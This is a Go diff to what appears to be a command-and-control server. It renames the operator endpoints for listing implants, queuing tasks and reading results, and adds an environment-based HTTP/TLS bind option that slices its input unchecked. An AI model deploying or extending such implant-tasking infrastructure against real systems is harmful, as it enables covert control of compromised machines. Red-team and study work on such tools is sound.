@@ -4,6 +4,7 @@ import (
 	"errors"
 	"log"
 	"net/http"
+	"os"
 	"strconv"
 
 	"asritha.dev/c2server/pkg/model"
@@ -25,14 +26,21 @@ func (l *HTTPSListener) Listen() {
 
 	// Operator endpoints
 	operator := router.Group("/operator")
-	operator.GET("/implants", l.ListImplants)
-	operator.GET("/implant/:id", l.GetImplant)
-	operator.GET("/tasks/:implant-id", l.ListTasks)
-	operator.GET("/tasks/:implant-id/:task-id", l.GetTask)
-	operator.POST("/tasks/:implant-id", l.AddTasks)
-	operator.GET("/results/:implant-id", l.ListResults)
+	operator.GET("/implants", l.OpListImplants)
+	operator.GET("/implant/:id", l.OpGetImplant)
+	operator.GET("/tasks/:implant-id", l.OpListTasks)
+	operator.GET("/tasks/:implant-id/:task-id", l.OpGetTask)
+	operator.POST("/tasks/:implant-id", l.OpAddTasks)
+	operator.GET("/results/:implant-id", l.OpListResults)
 
-	err := router.RunTLS(":443", "cert/c2.crt", "cert/c2.key")
+	// TODO: keep this in?
+	var err error
+	httpsBindAddr := os.Getenv("HTTPS_BIND_ADDR")
+	if httpsBindAddr[1:] == "80" {
+		err = router.Run(httpsBindAddr)
+	} else {
+		err = router.RunTLS(":443", "cert/c2.crt", "cert/c2.key")
+	}
 	if err != nil {
 		log.Fatalf("Failed to start HTTPS server: %v", err)
 	}
@@ -102,8 +110,7 @@ func (l *HTTPSListener) Beacon(c *gin.Context) {
 	c.JSON(http.StatusOK, newTasks)
 }
 
-// OPERATOR ENDPOINTS
-func (l *HTTPSListener) ListImplants(c *gin.Context) {
+func (l *HTTPSListener) OpListImplants(c *gin.Context) {
 	var implants []model.Implant
 	if err := l.db.Preload("Tasks").Preload("Tasks.Results").Find(&implants).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -112,7 +119,7 @@ func (l *HTTPSListener) ListImplants(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"implants": implants})
 }
 
-func (l *HTTPSListener) GetImplant(c *gin.Context) {
+func (l *HTTPSListener) OpGetImplant(c *gin.Context) {
 	id := c.Param("id")
 	var implant model.Implant
 	if err := l.db.Preload("Tasks").Preload("Tasks.Results").First(&implant, id).Error; err != nil {
@@ -121,7 +128,7 @@ func (l *HTTPSListener) GetImplant(c *gin.Context) {
 	}
 	c.JSON(http.StatusOK, gin.H{"implant": implant})
 }
-func (l *HTTPSListener) ListTasks(c *gin.Context) {
+func (l *HTTPSListener) OpListTasks(c *gin.Context) {
 	id := c.Param("implant-id")
 	var tasks []model.Task
 	if err := l.db.Where("implant_id = ?", id).Preload("Results").Find(&tasks).Error; err != nil {
@@ -131,7 +138,7 @@ func (l *HTTPSListener) ListTasks(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
 }
 
-func (l *HTTPSListener) GetTask(c *gin.Context) {
+func (l *HTTPSListener) OpGetTask(c *gin.Context) {
 	// pull both params
 	impIDStr := c.Param("implant-id")
 	taskIDStr := c.Param("task-id")
@@ -161,7 +168,7 @@ func (l *HTTPSListener) GetTask(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"task": task})
 }
 
-func (l *HTTPSListener) AddTasks(c *gin.Context) {
+func (l *HTTPSListener) OpAddTasks(c *gin.Context) {
 	id := c.Param("implant-id")
 	var implant model.Implant
 	if err := l.db.
@@ -192,7 +199,7 @@ func (l *HTTPSListener) AddTasks(c *gin.Context) {
 	c.JSON(http.StatusCreated, newTasks)
 }
 
-func (l *HTTPSListener) ListResults(c *gin.Context) {
+func (l *HTTPSListener) OpListResults(c *gin.Context) {
 	id := c.Param("implant-id")
 
 	// get all tasks for implant
